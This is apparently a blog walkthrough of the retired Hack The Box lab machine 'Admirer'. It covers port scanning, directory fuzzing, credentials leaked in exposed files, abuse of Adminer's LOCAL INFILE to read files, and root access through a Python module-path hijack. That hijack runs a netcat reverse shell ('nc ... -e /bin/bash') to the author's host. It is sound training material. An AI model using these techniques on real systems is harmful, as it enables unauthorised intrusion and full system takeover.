---
layout: post  
title: "Admirer: Hack The Box Walkthrough"
date: 2020-09-27 16:39:09 +0000
last_modified_at: 2020-09-27 16:39:09 +0000
category: Walkthrough
tags: ["Hack The Box", Admirer, retired, Linux, Easy]
comments: true
image:
  feature: admirer-htb-walkthrough.png
---

This post documents the complete walkthrough of Admirer, a retired vulnerable [VM][1] created by [GibParadox][2] and [polarbearer][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Admirer is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.187 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-05-04 02:44:13 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.187
Discovered open port 21/tcp on 10.10.10.187
Discovered open port 22/tcp on 10.10.10.187
```

Pretty common list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,80 -A --reason 10.10.10.187 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
```

Looks like `http` is the way to go. Here's what the site looks like.

{% include image.html image_alt="715c00d4.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/715c00d4.png" %}

Visually stunning!

### Checking out `robots.txt`

Notice that `robots.txt` is available from the `nmap` scan?

{% include image.html image_alt="993f756b.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/993f756b.png" %}

I guess it's telling me to fuzz the `/admin-dir` directory.

### Directory/File Enumeration

Let's do that with `gobuster`.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 20 -e -s '200,301,302' -x php,txt -u http://10.10.1
0.187/admin-dir/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/05/04 03:46:31 Starting gobuster
===============================================================
http://10.10.10.187/admin-dir/contacts.txt (Status: 200)
http://10.10.10.187/admin-dir/credentials.txt (Status: 200)
===============================================================
2020/05/04 03:55:03 Finished
===============================================================
```

What do we have here? **Contacts**.

{% include image.html image_alt="1eed789c.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/1eed789c.png" %}

And here? **Credentials**.

{% include image.html image_alt="181eb375.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/181eb375.png" %}

### Snooping in FTP

Let's see if we can access the FTP service with this credential (`ftpuser:%n?4Wz}R$tTF7`).

{% include image.html image_alt="17121c42.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/17121c42.png" %}

`html.tar.gz` appears to be the backup archive of the site. Look what I found in `index.php`.

```php
<?php
    $servername = "localhost";
    $username = "waldo";
    $password = ']F7jLHw:*G>UPrTo}~A"d6b';
    $dbname = "admirerdb";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $sql = "SELECT * FROM items";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        // output data of each row
        while($row = $result->fetch_assoc()) {
            echo "<article class='thumb'>";
    echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>";
    echo "<h2>".$row["title"]."</h2>";
    echo "<p>".$row["text"]."</p>";
    echo "</article>";
        }
    } else {
        echo "0 results";
    }
    $conn->close();
?>
```

### ~~Hail Hydra~~

Now that we have so many passwords, one of them got to work for `waldo`'s SSH account right? In my opinion, there's no better tool than `hydra` to test for password validity.

{% include image.html image_alt="20269099.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/20269099.png" %}

Bummer. No password for `waldo` and `ftpuser` has no shell.

### Directory/File Enumeration (2)

Back to the drawing board of enumeration. This time I'm going to focus in the `/utility-scripts` directory since we know that it exists from the `html` backup.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc '403,404' http://10.10.10.187/utility-scripts/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/utility-scripts/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000593:   200        51 L     235 W    4156 Ch     "/adminer.php"
000001402:   200        964 L    4976 W   84072 Ch    "/info.php"

Total time: 45.38395
Processed Requests: 2439
Filtered Requests: 2437
Requests/sec.: 53.74145
```

Hmm. What is `adminer.php`?

### Adminer previously known as phpMinAdmin

According to [Wikipedia](https://en.wikipedia.org/wiki/Adminer),

> Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007.

{% include image.html image_alt="792c53cb.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/792c53cb.png" %}

Any version of Adminer below 4.6.3 is susceptible to this [vulnerability](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f). We can instruct Adminer to connect to a MySQL database server on my attacking machine and abuse MySQL LOCAL INFILE to read files from the machine.

#### Setting up MySQL/MariaDB

Edit `/etc/mysql/mariadb.conf.d/50-server.cnf` to bind MySQL to your HTB IP address.

```
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
# bind-address           = 127.0.0.1
bind-address             = 10.10.16.125
```

Start the server like so.

```
# systemctl start mysql
```

Create a database and a user, and then grant permissions to that database.

{% include image.html image_alt="49f2a22a.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/49f2a22a.png" %}

Once that's done, we can connect to it with Adminer.

{% include image.html image_alt="8139c6fa.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/8139c6fa.png" %}

And bam, we're in!

{% include image.html image_alt="01761d50.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/01761d50.png" %}

#### LOAD LOCAL INFILE

From here on, I'll use Adminer to create a table with one column. This is to populate the table with files that I've read.

{% include image.html image_alt="29877fa6.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/29877fa6.png" %}

Now, let's read some files.

{% include image.html image_alt="8477a2c2.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/8477a2c2.png" %}

Meanwhile back at our attacking machine.

```
MariaDB [admirer]> select * from files;
+----------------------------------------------------------------+
| content                                                        |
+----------------------------------------------------------------+
|            $servername = "localhost";                          |
|            $username = "waldo";                                |
|            $password = "&<h5b~yK3F#{PaPB&dA}{H>";              |
|            $dbname = "admirerdb";                              |
+----------------------------------------------------------------+
```

I think we have `waldo`'s SSH password.

## Low-Privilege Shell

With that, we can log on to `waldo`'s SSH account.

{% include image.html image_alt="3be1546c.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/3be1546c.png" %}

The file `user.txt` is at `waldo`'s home directory.

{% include image.html image_alt="91c3c1ce.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/91c3c1ce.png" %}

## Privilege Escalation

During enumeration of `waldo`'s account, I notice that `waldo` is able to `sudo` the following.

{% include image.html image_alt="8275d38b.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/8275d38b.png" %}

That tells me that I can do something like this.

```
$ sudo ENV=some_value /opt/script/admin_tasks.sh
```

And that `ENV` will be taken into account when `admin_tasks.sh` is ran with `sudo`, i.e. as `root`. Notice that in `/opt/scripts` there's a Python script `backup.py`?

<div class="filename"><span>backup.py</span></div>

```python
from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

The `backup.py` script is further referenced in `admin_tasks.sh`.

{% include image.html image_alt="ddb46bf4.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/ddb46bf4.png" %}

So, if I hijack the Python search path for Python `shutil` module's `make_archive` function with something of my own, I can perform a privilege escalation! Here's my `shutil.py`.

```python
import os

def make_archive(a, b, c):
  os.system("/bin/nc 10.10.16.125 1234 -e /bin/bash")
```

Needless to say, I've set up a `netcat` listener on my attacking machine to catch the reverse shell.

{% include image.html image_alt="51ed87dd.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/51ed87dd.png" %}

Bombs away...

{% include image.html image_alt="53151f0f.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/53151f0f.png" %}

With that, it's trivial to retrieve `root.txt`.

{% include image.html image_alt="b0e5f67b.png" image_src="/c8399ad4-5424-4ab4-b255-085e004f3873/b0e5f67b.png" %}

:dancer:


[1]: https://www.hackthebox.eu/home/machines/profile/248
[2]: https://www.hackthebox.eu/home/users/profile/125033
[3]: https://www.hackthebox.eu/home/users/profile/159204
[4]: https://www.hackthebox.eu/
